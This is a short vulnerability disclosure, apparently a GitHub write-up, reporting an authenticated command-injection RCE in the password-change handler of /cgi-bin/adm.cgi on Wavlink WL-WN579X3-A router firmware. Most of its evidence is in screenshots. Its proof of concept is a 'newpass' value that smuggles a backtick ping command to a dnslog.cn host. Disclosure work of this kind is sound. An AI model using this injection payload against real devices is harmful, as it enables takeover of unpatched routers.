
A issue was dicovered on wavlink device with firmware at least from M79X3.V5030.180530 to M79X3.V5030.201201(newest version for now).   

A remote attacker can execute arbitrary code by sending  a crafted POST request to /cgi-bin/adm.cgi.    


## Intro 

When I was trying to analyze CVE-2020-10971，I downloaded the newest WL-WN579X3-A firmware posted on the official website of Wavlink.   

Firmware: https://www.wavlink.com/en_us/firmware/details/3a4d65ad3d.html  

After I checked all the code branches, I couldn't find the CVE-2020-10971, then I find a more old version firmware on the internet, I do notice that there was a RCE problem at adm.cgi correspond to https://james-clee.com/2020/04/18/multiple-wavlink-vulnerabilities/ .     

![](https://github.com/s0duku/issues/blob/main/wavlink/WL-WN579X3-A_RCE/5.png?raw=true)   

However I notice another RCE at the code branch which is responsible for handling password changes.  

The router has RCE problem when the web server are handling the request for changing the password from authenticated user.  

## The problem code    

![](https://github.com/s0duku/issues/blob/main/wavlink/WL-WN579X3-A_RCE/6.png?raw=true)    

![](https://github.com/s0duku/issues/blob/main/wavlink/WL-WN579X3-A_RCE/7.png?raw=true) 

![](https://github.com/s0duku/issues/blob/main/wavlink/WL-WN579X3-A_RCE/8.png?raw=true) 


## POC  

It not just affect the newest firmware, but alse the older version (at the newest version, serveral IP checks made the attacker can only use the RCE in adjacent networks).  

![](https://github.com/s0duku/issues/blob/main/wavlink/WL-WN579X3-A_RCE/1.png?raw=true)     

Set the 'newpass' value as %60ping%20-c%201%203vkslf.dnslog.cn%60 (\`ping -c 1 3vkslf.dnslog.cn\`)     

![](https://github.com/s0duku/issues/blob/main/wavlink/WL-WN579X3-A_RCE/9.png?raw=true)   

After I sended the POST request, DNSlog platform had the records   

![](https://github.com/s0duku/issues/blob/main/wavlink/WL-WN579X3-A_RCE/10.png?raw=true) 







